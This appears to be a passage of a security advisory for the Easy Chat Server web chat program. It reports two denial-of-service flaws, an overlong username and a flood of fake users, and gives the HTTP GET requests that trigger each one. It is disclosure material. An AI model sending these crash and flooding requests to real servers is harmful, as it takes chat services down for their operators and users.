Vendor's Description:

"Easy Chat Server is a easy, fast and affordable way to host and manage
your own real-time communication software, it allows friends/colleagues
to chat with you through a Web Browser (IE, Netscape, Mozilla, Opera
etc.) on any computer (Windows, Linux, Solaris...) without any special
plug-ins or software. It can help you setup your community chat rooms,
collaborative work sessions or online meetings."

2. The bugs:
-------------

The program has two DoS vulnerabilties, due to:

- long username
- fake users


[1] The program doesn't correctly manage the username, in fact if you
    try to send a big username string to the server it will crash.


[2] The program has no strong checks on the users who join into free
    rooms. In fact it's possible to add a large number of fake users
    and the chat server will go down.

3. The code:
-------------

To test the vulnerabilities:

[1] 
    GET /chat.ghp?username=aaaa[ 295 of a ]aaaa&password=&room=1&sex=0
    Host: http://[host]

[2] 
    GET /chat.ghp?username=FakeUser&password=&room=1&sex=0
    Host: http://[host]
    ( this will add a fake user with name: FakeUser )
